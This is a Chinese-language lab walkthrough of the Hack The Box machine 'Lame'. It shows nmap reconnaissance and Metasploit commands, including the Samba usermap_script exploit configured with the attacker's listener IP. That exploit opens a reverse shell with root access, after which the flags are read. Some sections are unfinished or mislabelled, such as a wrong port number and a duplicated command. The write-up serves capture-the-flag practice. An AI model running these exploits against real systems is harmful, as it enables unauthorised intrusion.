---
title: Lame Writeup
date: 2020-11-05 02:22:09
category: Hack The Box
---

# Lame Writeup

![](./1.png)

## 0x01 信息收集

上来第一件事先扫下开放端口，刚开始先用脚本把全端口跑一遍。

在目录下新建一个 nmap 文件夹用来放扫描结果，整个渗透过程中可能存在多阶段扫描，很多结果需要分类。

### 1、TCP Scan

第一次扫描 TCP 端口可以取名为 `tcp.*`，放在 `nmap/` 下。这里有两种扫法**

**直接扫全端口。**
``` java
nmap -A -p- -oA nmap/tcp 10.10.10.3
```
`-A` == `-sC -sV -O -traceroute`
- **-sC**: 会执行默认脚本
- **-sV**: 检测开放端口的服务版本
- **-O**: 检测操作系统
- **-traceroute**: 路由跟踪
- **-p-**: 1-65535 全端口探测
- **-oA**: 输出所有格式的信息并存为 nmap/tcp.*

**如果想先快速扫开放端口，再扫服务，差别不大，[对比看这里](../../../oscp/Nmap-Tips/#0x02-扫描速度)。**

康康扫到了啥。
- **21**: vsftpd 2.3.4，且允许匿名登录
- **22**: openssh 4.7，允许 root 密码登录，可爆破
- **139**: samba 3.x ~ 4.x，可能是漏洞版本
- **445**: samba 3.0.20-Debian，可能是漏洞版本
- **3632**: distccd v1，分布式编译器守护进程

![](./3.png)

### 2、UDP Scan

第二次扫描看看有没有开放的 UDP 端口，可以取名为 `udp.*`，放在 `namp` 下。
``` java
nmap -sU -p- -oA nmap/udp 10.10.10.3
```
没有扫到，无 UDP 端口开放。

## 0x02 根据端口逐一突破

### 1、Port 21
google 一下发现 `vsftpd v2.3.4` 有公开 RCE，是开发哥写的后门，康康 `nmap` 有无脚本，路径在 `/usr/share/nmap/scripts/*`。
``` java
ll /usr/share/nmap/scripts/ftp*
```
![](./13.png)
`nmap` 扫一下，没有详细漏洞回显，说明这里无法利用。
``` java
nmap --script ftp-vsftpd-backdoor -p 21 10.10.10.3
```
![](./5.png)
不甘心，上 MSF 找下 exp 试试，然后也打不下来，可能**已经打了补丁？还是姿势不对？总之这里搞不来**，下一位。。。
``` java
search samba
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set rhosts 10.10.10.3
exploit
```
![](./6.png)

### 2、Port 22
google 一下没有找到有用的漏洞，dos 啥的没用。找下 `nmap` 相关脚本。
``` java
ll /usr/share/nmap/scripts/ssh*
```
脚本扫出允许公钥和密码登录，可以爆破。但是**爆破这玩意不靠谱，先放一下**后面再说。
``` java
nmap --script ftp-vsftpd-backdoor -p 21 10.10.10.3
```
![](./4.png)

### 3、Port 139、445
google 一下当前版本，找到几个可能用得上。
- 3.x ~ 4.x: smb-vuln-cve-2017-7494
- 3.x: smbclient 后门
- 3.2.20: username_map_script RCE
`nmap` 扫下。。
。（明天再写）
。

MSF 开起来，搜关键字。
``` java
search samba
```
先观察 `rank` 为 `excellent` 的，从第一个看起。

![](./7.png)
`info` 命令查看 exp 介绍和配置。
``` java
info exploit/linux/samba/is_known_pipename
```
描述说需要一个有效的凭证，目前手头没有凭证，这个模块暂不可用。

![](./8.png)
看下一个。

![](./9.png)
`info` 是个好东西，要常用。
``` java
info exploit/multi/samba/usermap_script
```
根据描述，该 exp 可以利用 `3.0.20 ~ 3.0.25rc3` 版本 samba 存在的 RCE 漏洞，根据前面信息收集，靶机版本为 `3.0.20` 符合要求。

![](./10.png)
决定先用这个 exp 试试，设置好相应参数，`exploit` 执行。有几个地方需要注意一下。
- rport 默认 139，但是根据扫描结果，139 端口并未探明服务版本，而是给了一个比较大的区间 `3.x ~ 4.x`，所以先选了**确定存在漏洞版本的 445 端口**。
- lhost 默认应该会取一个距离目标最近的 ip（纯个人判断，未了解这里的取值机制），所以这里默认取 `10.10.10.133`，但这 ip 并不是我的 vpn ip，只是碰巧之前设置内网 ip 的时候配了个 `10.10.10.x`，所以这里要改成 vpn ip `10.10.14.11`，一般情况下**默认取值为 vpn ip 不需要改**。
``` java
use exploit/multi/samba/usermap_script
set rhosts 10.10.10.3
set rport 445
set lhost 10.10.14.11
exploit
```
执行以后看到收到反弹 shell，看到 `Command shell session 1 opened (10.10.14.11:4444 -> 10.10.10.3:60557) at 2020-11-08 02:28:38 +0800`，会话生成。
输入命令 `hostname`、`id` 确认获取到靶机 `root` 权限。
``` java
hostname
id
```
![](./11.png)
翻文件，flag 一般在用户个人目录下，最后在 `/root/root.txt`、`/home/makis/user.txt` 找到 flag。

![](./12.png)

### 4、Port 3626
虽然在上个端口已经拿下了，还是要看看最后一个端口有无搞头。
